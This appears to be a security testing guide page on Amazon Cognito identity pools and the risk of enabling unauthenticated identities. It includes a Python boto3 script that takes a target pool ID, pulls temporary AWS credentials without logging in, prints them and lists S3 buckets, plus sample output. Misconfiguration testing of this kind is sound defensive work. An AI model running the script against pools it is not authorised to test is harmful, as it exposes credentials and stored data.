# Cognito Overview

Cognito provides developers with an authentication, authorization and user management system that can be implemented in web applications. Cognito is divided in two main components: User Pools<ref>Amazon Cognito User Pool https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-identity-pools.html</ref> and Identity Pools<ref>Amazon Cognito Identity Pools https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-identity.html</ref>. The Amazon documentation on Cognito states that:

<blockquote>
User pools are user directories that provide sign-up and sign-in options for your app users. Identity pools enable you to grant your users access to other AWS services. You can use identity pools and user pools separately or together.<ref>What is Amazon Cognito? https://docs.aws.amazon.com/cognito/latest/developerguide/what-is-amazon-cognito.html</ref></blockquote>

From a security perspective, identity pools in Cognito is interesting as it can provide access to other Amazon Web Services. 


=== Identity Pools ===
Identity pools are identified by an ID that looks like the following
<pre>
us-east-1:1a1a1a1a-ffff-1111-9999-12345678
</pre>

A web application will thus query Cognito by specifying the proper Identity pool ID in order to get temporary limited-privilege AWS credentials to access other AWS services. An identity pool also allows to specify a role for users that are not authenticated.
In the Cognito configuration page, there is the option to enable Unauthenticated identities which, as Amazon describes it:

<blockquote>
Unauthenticated roles define the permissions your users will receive when they access your identity pool without a valid login.
</blockquote>

'''Example:'''<br>
Consider the following scenario of a web application that allows access to S3 buckets upon proper authentication with the identity pool that provides temporary access to the bucket. Suppose that the identity pool has also been configured to grant access to unauthenticated identities with the same privileges of accessing S3 buckets. The following python script will try to get unauthenticated credentials and use them to list the S3 buckets.
The script requires <code>boto3</code><ref><code>boto3</code> https://boto3.amazonaws.com/v1/documentation/api/latest/index.html</ref>:
<pre>
pip install boto3
</pre>

In the following script, just replace <code>IDENTITY_POOL</code> with the target Identity Pool ID. 

<pre>
import boto3
from botocore.exceptions import ClientError

try:
    # Get access token
    client = boto3.client('cognito-identity', region_name="us-east-2")
    resp =  client.get_id(IdentityPoolId=[IDENTITY_POOL])

    print "\nIdentity ID: %s"%(resp['IdentityId'])
    print "\nRequest ID: %s"%(resp['ResponseMetadata']['RequestId'])
    resp = client.get_credentials_for_identity(IdentityId=resp['IdentityId'])
    secretKey = resp['Credentials']['SecretKey']
    accessKey = resp['Credentials']['AccessKeyId']
    sessionToken = resp['Credentials']['SessionToken']
    print "\nSecretKey: %s"%(secretKey)
    print "\nAccessKey ID: %s"%(accessKey)
    print "\nSessionToken %s"%(sessionToken)

    # Get all buckets names
    s3 = boto3.resource('s3',aws_access_key_id=accessKey, aws_secret_access_key=secretKey, aws_session_token=sessionToken, region_name="eu-west-1")
    print "\nBuckets:"
    for b in s3.buckets.all():
        print b.name

except (ClientError, KeyError):
    print "No Unauth"
    exit(0)
</pre>

In the case unauthenticated access to S3 buckets is allowed, the output should look like this:
<pre>
Identity ID: us-east-2:ddeb887a-e235-41a1-be75-2a5f675e0944
Request ID: cb3d99ba-b2b0-11e8-9529-0b4be486f793
SecretKey: wJE/[REDACTED]Kru76jp4i
AccessKey ID: ASI[REDACTED]MAO3
SessionToken AgoGb3JpZ2luELf[REDACTED]wWeDg8CjW9MPerytwF

Buckets:
bucket-test-01
bucket-test-02
</pre>

== References ==

